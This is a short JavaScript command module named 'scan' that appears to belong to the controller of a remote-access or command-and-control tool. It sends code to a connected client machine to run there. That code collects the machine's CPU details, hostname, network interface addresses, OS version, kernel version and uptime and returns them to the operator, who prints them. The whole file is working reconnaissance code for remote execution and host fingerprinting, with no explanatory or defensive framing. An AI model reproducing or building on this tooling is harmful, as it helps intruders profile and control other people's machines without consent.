module.exports = {
    name: 'scan',
    usage: 'scan',
    args: {

    },
    description: 'scans for some data',
    run: async (methods, args) => {
        const { send, feedback, code, clientResponse } = methods
        var cmd = `
        const os = require('os');
        let res = '';
        res += os.arch() + ';';
        res += os.cpus()[0].model + ';';
        res += os.cpus().length + ';';
        res += os.hostname() + ';';
        res += Object.keys(os.networkInterfaces()).map(i => os.networkInterfaces()[i][0].address).join(',') + ';';
        res += os.platform() + ';';
        res += os.release() + ';';
        res += os.uptime() + ';';
        res += os.version() + ';';
        ${feedback('res')}
        `
        send(0x02, code(cmd))
        let res = await clientResponse(20000);
        res = res.split(';')
        console.log(`
        CPU Arch: ${res[0]}
        CPU: ${res[1]}
        CPU Cores: ${res[2]}
        Hostname: ${res[3]}
        Network Interfaces: ${res[4].replace(',', ', ')}
        Platform: ${res[5]}
        OS Release: ${res[6]}
        Kernel Version: ${res[8]}
        System Uptime: ${res[7]}
        `)
    }
}